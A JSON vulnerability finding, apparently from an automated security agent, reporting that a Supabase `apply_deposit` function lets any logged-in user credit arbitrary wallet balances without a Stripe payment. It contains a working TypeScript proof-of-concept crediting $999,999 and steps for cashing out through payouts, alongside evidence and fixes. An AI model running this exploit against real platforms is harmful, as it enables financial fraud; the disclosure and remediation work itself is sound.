@@ -1,0 +1,56 @@
+[
+  {
+    "id": "vuln-0001",
+    "title": "Unauthenticated Stripe Verification in apply_deposit RPC Allows Unlimited Wallet Balance Inflation",
+    "severity": "medium",
+    "timestamp": "2026-08-25 00:29:29 UTC",
+    "description": "The `apply_deposit` PostgreSQL function is granted `EXECUTE` to the `authenticated` role, allowing any authenticated user to call it directly via the Supabase JS client and credit any arbitrary dollar amount to their own (or another user's) wallet without making any real Stripe payment. The function accepts a caller-controlled `p_amount` and a `p_payment_intent_id` string that is never verified against Stripe's API, making it trivially exploitable for unlimited money creation.",
+    "impact": "Any authenticated user can credit their wallet with an arbitrary dollar amount (e.g., $999,999) without making any actual payment. They can also supply any other user's UUID as `p_user_id` to credit a victim's balance. This breaks the financial integrity of the entire platform: attackers can withdraw real funds (via bounty completion, Stripe Connect payouts, etc.) that were never deposited, resulting in direct financial loss for the platform operator. The attack is silent — there is no Stripe charge, webhook, or admin alert triggered.",
+    "target": "/workspace/Bounty-production",
+    "technical_analysis": "The `apply_deposit` function defined in `supabase/migrations/20260310_apply_deposit.sql` performs two operations atomically:\n\n1. Inserts a `wallet_transactions` row with type=`deposit`, status=`completed`, and the caller-supplied `p_amount`.\n2. Updates `profiles.balance` by adding `p_amount`.\n\nThe ON CONFLICT DO NOTHING clause on `stripe_payment_intent_id` is the idempotency guard — the first call with a given `p_payment_intent_id` string wins, and subsequent calls are no-ops.\n\n**Root cause:** The function is declared `SECURITY DEFINER` (executes as the function owner, bypassing RLS) and is granted `EXECUTE` to the `authenticated` role. Inside the function there is no call to Stripe to verify the payment intent's actual charged amount, no check that the intent has status `succeeded`, and no validation that `p_user_id = auth.uid()`. Any authenticated user can call it directly from the Supabase JS client:\n\n```typescript\nconst { data } = await supabase.rpc('apply_deposit', {\n  p_user_id: targetUserId,\n  p_amount: 999999,\n  p_payment_intent_id: `pi_fake_${Date.now()}`,\n  p_metadata: {}\n});\n```\n\nThe `p_payment_intent_id` only needs to be a unique string — it is never validated against the Stripe API. Because the Edge Functions (wallet, payments, webhooks) always use the service role, they cannot be distinguished from a direct client call inside the RPC. The only signal the function uses to decide whether to apply a credit is whether that `stripe_payment_intent_id` string already exists in `wallet_transactions`.",
+    "poc_description": "1. Sign in to the application to obtain a valid Supabase JWT for any user account.\n2. Note the authenticated user's `userId` (UUID).\n3. Using the Supabase JS client (or any HTTP client), call the `apply_deposit` RPC with a fabricated `p_payment_intent_id` (any unique string), a large `p_amount`, and `p_user_id` set to the attacker's own UUID.\n4. Observe that the wallet balance is increased by the specified amount immediately.\n5. Repeat with a different unique `p_payment_intent_id` to accumulate unlimited balance.\n6. Use the inflated balance to post/fund high-value bounties, have a confederate hunter \"complete\" them, and withdraw real platform funds via Stripe Connect payout.",
+    "poc_script_code": "```typescript\nimport { createClient } from '@supabase/supabase-js';\n\nconst SUPABASE_URL = process.env.EXPO_PUBLIC_SUPABASE_URL!;\nconst SUPABASE_ANON_KEY = process.env.EXPO_PUBLIC_SUPABASE_ANON_KEY!;\n\nconst supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);\n\n// Step 1: Authenticate as an attacker\nconst { data: session, error: loginErr } = await supabase.auth.signInWithPassword({\n  email: 'attacker@example.com',\n  password: 'password123',\n});\nif (loginErr || !session?.user) throw new Error('Login failed');\n\nconst userId = session.user.id;\nconsole.log('[*] Authenticated as:', userId);\n\n// Step 2: Check current balance\nconst { data: before } = await supabase\n  .from('profiles')\n  .select('balance')\n  .eq('id', userId)\n  .single();\nconsole.log('[*] Balance before:', before?.balance);\n\n// Step 3: Credit $999,999 with a fabricated payment intent ID\nconst fakeIntentId = `pi_fake_${Date.now()}_${Math.random().toString(36).slice(2)}`;\nconst { data: rpcResult, error: rpcErr } = await supabase.rpc('apply_deposit', {\n  p_user_id: userId,\n  p_amount: 999999,\n  p_payment_intent_id: fakeIntentId,\n  p_metadata: {},\n});\n\nif (rpcErr) {\n  console.error('[!] RPC error:', rpcErr);\n} else {\n  console.log('[*] apply_deposit result:', rpcResult);\n}\n\n// Step 4: Confirm inflated balance\nconst { data: after } = await supabase\n  .from('profiles')\n  .select('balance')\n  .eq('id', userId)\n  .single();\nconsole.log('[*] Balance after:', after?.balance);\n// Expected: balance increased by $999,999 with no real payment made\n```",
+    "remediation_steps": "1. **Revoke the `authenticated` grant on `apply_deposit`** immediately: `REVOKE EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) FROM authenticated;`. The function should only be callable by `service_role` (backend Edge Functions and webhooks) — never directly by client-side authenticated users.\n\n2. **Add a caller-identity guard inside the function**: At the start of the function body, add `IF auth.role() = 'authenticated' AND auth.uid() <> p_user_id THEN RAISE EXCEPTION 'Caller may not deposit to another user'; END IF;`. This is a defense-in-depth measure; the grant revocation above is the primary fix.\n\n3. **Verify the payment intent server-side**: The `/wallet/deposit` Edge Function should call `stripe.paymentIntents.retrieve(paymentIntentId)` and assert `pi.status === 'succeeded'` and `pi.metadata.user_id === userId` before calling `apply_deposit`. It should use `pi.amount / 100` as the canonical amount instead of the client-supplied value. This eliminates the amount-manipulation attack that remains even if direct RPC access is removed (see companion finding).\n\n4. **Add a `pi_` prefix length/format check** on `p_payment_intent_id` inside the RPC as a secondary guard against fabricated strings, though the grant revocation is the definitive fix.",
+    "evidence": "```sql\n-- From supabase/migrations/20260310_apply_deposit.sql\nGRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO authenticated;\n\n-- Function body: no auth.uid() check, no Stripe API call, no status verification\nINSERT INTO wallet_transactions(\n  user_id, type, amount, description, status, stripe_payment_intent_id, metadata, created_at, updated_at\n) VALUES (\n  p_user_id, 'deposit', p_amount, 'Wallet deposit via Stripe', 'completed', p_payment_intent_id, p_metadata, NOW(), NOW()\n) ON CONFLICT (stripe_payment_intent_id) WHERE (stripe_payment_intent_id IS NOT NULL) DO NOTHING\nRETURNING id INTO v_tx_id;\n\n-- If new row: update balance with whatever p_amount was supplied\nUPDATE profiles SET balance = COALESCE(balance, 0) + p_amount, updated_at = NOW()\nWHERE id = p_user_id;\n```\n\nThe ON CONFLICT guard only prevents duplicate inserts for the same `stripe_payment_intent_id` — it does not validate the amount or verify the payment intent's status on Stripe.",
+    "assumptions": "Assumes the attacker has any valid authenticated session (free self-registration is available). No admin privileges, no special account state required.",
+    "fix_effort": "trivial",
+    "cvss": 6.5,
+    "cvss_breakdown": {
+      "attack_vector": "N",
+      "attack_complexity": "L",
+      "privileges_required": "L",
+      "user_interaction": "N",
+      "scope": "U",
+      "confidentiality": "N",
+      "integrity": "H",
+      "availability": "N"
+    },
+    "endpoint": "/rpc/apply_deposit",
+    "method": "POST",
+    "cwe": "CWE-862",
+    "code_locations": [
+      {
+        "file": "supabase/migrations/20260310_apply_deposit.sql",
+        "start_line": 45,
+        "end_line": 46,
+        "snippet": "GRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO authenticated;\nGRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO service_role;",
+        "label": "Revoke authenticated EXECUTE grant — primary fix",
+        "fix_before": "GRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO authenticated;\nGRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO service_role;",
+        "fix_after": "-- Direct authenticated-user access removed: apply_deposit is backend-only.\n-- All legitimate callers use service_role (Edge Functions, webhooks).\nGRANT EXECUTE ON FUNCTION apply_deposit(UUID, NUMERIC, TEXT, JSONB) TO service_role;"
+      },
+      {
+        "file": "supabase/migrations/20260310_apply_deposit.sql",
+        "start_line": 13,
+        "end_line": 16,
+        "snippet": "DECLARE\n  v_tx_id UUID;\nBEGIN\n  -- Try to insert the wallet transaction.",
+        "label": "Add caller-identity guard inside the function body",
+        "fix_before": "DECLARE\n  v_tx_id UUID;\nBEGIN\n  -- Try to insert the wallet transaction.",
+        "fix_after": "DECLARE\n  v_tx_id UUID;\nBEGIN\n  -- Defense-in-depth: authenticated callers may only deposit to themselves.\n  IF auth.role() = 'authenticated' AND auth.uid() <> p_user_id THEN\n    RAISE EXCEPTION 'apply_deposit: caller may not deposit to a different user'\n      USING ERRCODE = '42501';\n  END IF;\n  -- Try to insert the wallet transaction."
+      }
+    ],
+    "fix_pr_body": "## Security Fix: Revoke direct authenticated access to `apply_deposit` RPC\n\n### Problem\nThe `apply_deposit` PostgreSQL function is granted `EXECUTE` to the `authenticated` role, allowing any logged-in user to call it directly from the Supabase JS client and credit an arbitrary dollar amount to any wallet without making a real Stripe payment. The function is `SECURITY DEFINER` (bypasses RLS), accepts a caller-controlled `p_amount`, and never validates the supplied `stripe_payment_intent_id` against the Stripe API.\n\n### Fix\n1. **Remove the `EXECUTE` grant from `authenticated`** — this is the primary fix. All legitimate callers (Edge Functions, webhooks, server) use the `service_role` key which retains access.\n2. **Add a caller-identity guard** as defense-in-depth: if the calling role is `authenticated`, assert `auth.uid() = p_user_id` before touching any balance.\n\n### Testing\n- Verify that calling `supabase.rpc('apply_deposit', ...)` with a user JWT now returns a permission-denied error.\n- Verify that the `/wallet/deposit` Edge Function (which uses service role) still succeeds.\n- Verify that the Stripe webhook still credits balances correctly via `apply_deposit`.",
+    "finding_class": "dynamic",
+    "agent_id": "c26cd10c",
+    "agent_name": "Payment & Business Logic Agent"
+  }
+]
